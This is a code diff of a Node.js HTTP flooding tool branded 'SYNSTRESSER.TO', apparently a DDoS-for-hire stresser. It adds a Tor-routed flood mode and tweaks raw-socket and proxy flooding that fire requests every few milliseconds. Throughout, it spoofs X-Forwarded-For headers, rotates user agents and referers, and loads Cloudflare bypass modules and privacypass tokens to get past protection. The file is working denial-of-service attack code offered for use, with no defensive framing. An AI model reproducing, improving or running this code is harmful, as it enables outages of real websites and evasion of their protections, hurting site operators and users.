@@ -1,8 +1,11 @@
+
 // Global error handling (Ignoring system for helpless error logs)
 const request = require('request'),
     cloudscraper = require('cloudscraper'),
+    Agent = require('socks5-http-client/lib/Agent'), // npm install socks5-http-client
     net = require('net'),
     URL = require('url'),
+    tr = require('tor-request'); // npm install tor-request; apt-get install tor
     requestJar = request.jar(),
     reqCookie = request.defaults({
         jar: requestJar
@@ -12,10 +15,13 @@ const request = require('request'),
     }),
     randomWords = require('./random-words'),
     bypasses = require('./bypasses/'),
+    {
+        workerData
+    } = require('worker_threads'),
     events = require('events'),
     ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
-    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
-	
+    ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
+
 process.on('uncaughtException', function (e) {
     if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
     console.warn(e);
@@ -31,16 +37,35 @@ events.EventEmitter.defaultMaxListeners = Infinity;
 events.EventEmitter.prototype._maxListeners = Infinity;
 // Logging:
 
-global.window = {};
+global.logger = function () {
+    var first_parameter = arguments[0];
+    var other_parameters = Array.prototype.slice.call(arguments, 1);
 
-function randomStr() {
+    function formatConsoleDate(date) {
+        var hour = date.getHours();
+        var minutes = date.getMinutes();
+        var seconds = date.getSeconds();
+        var milliseconds = date.getMilliseconds();
 
-}
+        return '[' +
+            ((hour < 10) ? '0' + hour : hour) +
+            ':' +
+            ((minutes < 10) ? '0' + minutes : minutes) +
+            ':' +
+            ((seconds < 10) ? '0' + seconds : seconds) +
+            '.' +
+            ('00' + milliseconds).slice(-3) +
+            '] ';
+    }
 
-function INIT(workerData) {
-    logger('ATTACK STARTING :: ', workerData.target, {
+    console.log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
+};
+
+function INIT() {
+    logger('STARTING (SYNSTRESSER.TO) :: ', workerData.target, 'FOR', workerData.duration, 'MS', {
         proxies: workerData.proxies.length,
-        opt: workerData.opt
+        opt: workerData.opt,
+        mode: workerData.mode
     });
 
     // STATE:
@@ -92,6 +117,7 @@ function INIT(workerData) {
         }
     }
 
+
     if (l7.mode == 'raw') {
         ATTACK = function () {
             let dua = flooder.randomUA;
@@ -101,7 +127,6 @@ function INIT(workerData) {
             setTimeout(() => {
                 logger('Attack finished');
                 process.exit(4);
-
             }, STATE.expire - Date.now());
             logger('Starting proxyless :: ', l7.target);
             setInterval(() => {
@@ -114,7 +139,8 @@ function INIT(workerData) {
                         'User-Agent': dua,
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                         'Accept-Encoding': 'gzip, deflate, br',
-                        'Accept-Language': 'en-US,en;q=0.9'
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Connection': 'Keep-Alive'
                     }
                 });
             }, 1);
@@ -126,6 +152,9 @@ function INIT(workerData) {
         constructor(config) {
             initMode();
             logger('Bypass instance was made :: ', l7.firewall);
+            /*if (!l7.firewall) { // If there's no firewall; set it to be true (to "fake" firewall and use universal;)
+                l7.firewall = true;
+            }*/
             if (l7.firewall) {
                 if (STATE.available.includes(l7.firewall[0])) {
                     BYPASS = this.load(l7.firewall[0]);
@@ -264,12 +293,10 @@ function INIT(workerData) {
             return `${randomIp()}, ${randomIp()}`;
         }
 
-        get realize() {
-            return l7.target.replace(/%RAND%/g, randomWords()).replace(/%RAND2%/g, randomStr());
-        }
-
         init(e) {
-            e.url = l7.target.replace(/%RAND%/g, randomWords());
+            if (l7.target.indexOf("%RAND%") !== -1) {
+                e.target = l7.target.replace(/%RAND%/g, randomWords());
+            }
             if (l7.opt.body && l7.opt.body.indexOf("%RAND%") !== -1) {
                 e.body = l7.opt.body.replace(/%RAND%/g, randomWords());
             }
@@ -285,10 +312,6 @@ function INIT(workerData) {
         }
 
         init_proxy(c) {
-            if (c.proxy.indexOf('@') !== -1) {
-                //Requires authentication:
-                return flooder.init_request(c);
-            }
             c = flooder.init(c);
             c.proxy = c.proxy.split('://')[1].split(':');
             ATTACK(c);
@@ -296,18 +319,19 @@ function INIT(workerData) {
 
         init_request(d) {
             d = flooder.init(d);
-            d.url = d.url || l7.target;
+            d.url = d.target || l7.target;
+            delete d.target;
             d.method = l7.opt.method;
             d.timeout = 10e3;
             d.insecure = true;
-            d.gzip = true;
             d.headers = {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8',
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Accept-Language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,tr;q=0.6',
                 'Cache-Control': 'max-age=0',
                 'Pragma': 'no-cache',
-                'Referer': (coinFlip() ? flooder.randomReferer : d.url),
+                'Connection': 'Keep-Alive',
+                'Referer': l7.opt.refer || (coinFlip() ? flooder.randomReferer : d.url),
                 'Upgrade-Insecure-Requests': 1,
                 'User-Agent': d.userAgent,
                 'X-Forwarded-For': flooder.randomSpoof
@@ -334,7 +358,7 @@ function INIT(workerData) {
                         }
                         return netSock.destroy();
                     }
-                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${flooder.realize} HTTP/1.1\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
+                    (netSock.writable && !netSock.destroyed) ? netSock.write(`${l7.opt.method} ${a.target || l7.target} HTTP/1.1\r\nHost: ${l7.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nX-Forwarded-For: ${flooder.randomSpoof}\r\nReferer: ${l7.opt.refer || (coinFlip() ? flooder.randomReferer : l7.target)}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nUser-Agent: ${a.userAgent}\r\n\r\n${a.body || l7.opt.body || ""}`): netSock.end();
                 }
             var resetted = false,
                 netSock = {};
@@ -343,7 +367,7 @@ function INIT(workerData) {
                 host: a.proxy[0],
                 port: a.proxy[1]
             }, async () => {
-                for (let j = 0; j < a.proxy[0].length * 6; j++) {
+                for (let j = 0; j < a.proxy[0].length * 5; j++) {
                     await req();
                 }
                 netSock.on('data', async () => {
@@ -362,13 +386,12 @@ function INIT(workerData) {
     }
 
     // Initialize the flooding system: ( After bypass received cookies, start attacking ~ )
-
     let flooder = new Flood({
         threads: 1
     });
 
     class starter {
-        init(threads) {
+        init() {
             // Setup flooding interval;
 
             if (l7.opt.ratelimit) {
@@ -384,8 +407,8 @@ function INIT(workerData) {
                 function randomreq() {
                     reqCookie(PROPS[~~(Math.random() * PROPS.length)]);
                 }
-                for (let v = 0; v < threads; v++) {
-                    setInterval(randomreq, threads);
+                for (let v = 0; v < 2; v++) {
+                    setInterval(randomreq);
                 }
             }
         }
@@ -423,6 +446,7 @@ function INIT(workerData) {
                         'Pragma': 'no-cache',
                         'Upgrade-Insecure-Requests': 1,
                         'User-Agent': flooder.randomUA,
+                        'Referer': l7.opt.refer || (coinFlip() ? flooder.randomReferer : l7.target),
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                         'Accept-Encoding': 'gzip, deflate, br',
                         'Accept-Language': 'en-US,en;q=0.9',
@@ -505,7 +529,68 @@ function INIT(workerData) {
                     STATE.last.body = body;
                     STATE.last.res = res;
                 });
-            }		
+            }
+
+
+    const ports = [
+        '91',
+        '92',
+        '93',
+        '94',
+        '95',
+        '96',
+        '97',
+        '98',
+        '99',
+        '910',
+        '911',
+    ];
+
+    function randomInt(n) {
+        return Math.floor(Math.random() * n);
+    }
+
+    function randomPort() {
+        return ports[randomInt(ports.length)];
+    }
+
+    function torconfig() {
+        let dua = flooder.randomUA;
+        let port = randomPort();
+        setInterval(() => {
+            tr.request({
+                url: l7.target,
+                agentClass: Agent,
+                agentOptions: {
+                    socksHost: '127.0.0.1',
+                    socksPort: port
+                },
+                headers: {
+                    'Cache-Control': 'max-age=0',
+                    'Upgrade-Insecure-Requests': 1,
+                    'User-Agent': dua,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Connection': 'keep-alive'
+                }
+            }, function(err, res, body) {})
+        }, 4);
+    }
+
+    if (l7.mode == 'tor') {
+        STATE.running = true; // From now and so, script considered running;
+        STATE.expire = Date.now() + workerData.duration;
+        setTimeout(() => {
+            logger('Attack finished');
+            process.exit(4);
+        }, STATE.expire - Date.now());
+        logger('Starting tor flood :: ', l7.target);
+        for (let v = 0; v < 1; v++) {
+            torconfig()
+        }
+    }
+
             let tryrun = setInterval(() => {
                 STATE.running ? clearInterval(tryrun) : setImmediate(detectplz);
                 if (STATE.firewalls.length >= 1e3) {
@@ -513,44 +598,24 @@ function INIT(workerData) {
                     STATE.running = true; // From now and so, script considered running;
                     STATE.expire = Date.now() + workerData.duration;
 
-                    if (l7.mode == 'request') 
-                    {
-                        let tryINIT = () => 
-                        {
-                            if (PROPS.length > 0) 
-                            {
-                                Starter.init(4);
-                            } 
-                            else 
-                            {
+                    if (l7.mode == 'request') {
+                        let tryINIT = () => {
+                            if (PROPS.length > 0) {
+                                Starter.init();
+                            } else {
                                 setTimeout(tryINIT, 1e3);
                             }
                         }
                         tryINIT();
                     }
-                    setTimeout
-                    (
-                        () => 
-                        {
-                             
-                           console.log("\x1b[31mAttack finished wait...\x1b[0m");
-                           // logger('Attack finished');
-                           // process.exit(4);
-                           Starter.init(4);
-                           console.log("\x1b[35mAttack starting again.\x1b[0m");
-
-                        },
-                        STATE.expire - Date.now()
-                    );
-
+                    setTimeout(() => {
+                        logger('Attack finished');
+                        process.exit(4);
+                    }, STATE.expire - Date.now());
                     clearInterval(tryrun);
-
-                    for (var i = 0; i < STATE.firewalls.length; i++) 
-                    {
-                        if (Array.isArray(STATE.firewalls[i])) 
-                        {
-                            switch (STATE.firewall[0]) 
-                            {
+                    for (var i = 0; i < STATE.firewalls.length; i++) {
+                        if (Array.isArray(STATE.firewalls[i])) {
+                            switch (STATE.firewall[0]) {
                                 case 'cloudflare':
                                     STATE.firewall[1] = STATE.firewalls[i][1] !== 'captcha' ? STATE.firewalls[i][1] : STATE.firewall[1];
                                     if (l7.mode !== 'request' && ['captcha', 'uam'].indexOf(STATE.firewall[1]) !== -1) {
@@ -571,9 +636,12 @@ function INIT(workerData) {
                         }
                     }
                     l7.firewall = STATE.firewall;
+                    if (l7.firewall[0] == 'cloudflare') {
+                        l7.privacypass = require('./privacypass.json');
+                    }
                     this.cback() // Start bypassing :: After bypassed start attacking using "ATTACK" function;
                 } else {
-                   // logger(STATE.firewalls.length);
+                    //logger(STATE.firewalls.length);
                 }
             });
         }
@@ -588,32 +656,24 @@ function INIT(workerData) {
     }
 }
 
-let masterCallbacks = {
-    0: res => { new INIT(res); }
-}
+if (workerData) INIT();
 
-function ID() {
-    return Math.random().toString(36).substr(2, 9);
-}
 
-process.on('message', msg => {
-    let dfunc = masterCallbacks[0];
-    if (dfunc) {
-        dfunc.call(null, msg);
-        setTimeout(() => {
-            delete masterCallbacks[0];
-        }, 5e3);
-    }
-});
 
-global.Fc = (packet, callback) => {
-    let op_id = ID(),
-        dmsg = {
-            data: packet
-        }
-    if (callback) {
-        dmsg._ = packet._ || op_id;
-        masterCallbacks[op_id] = callback;
-    }
-    process.send(dmsg);
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
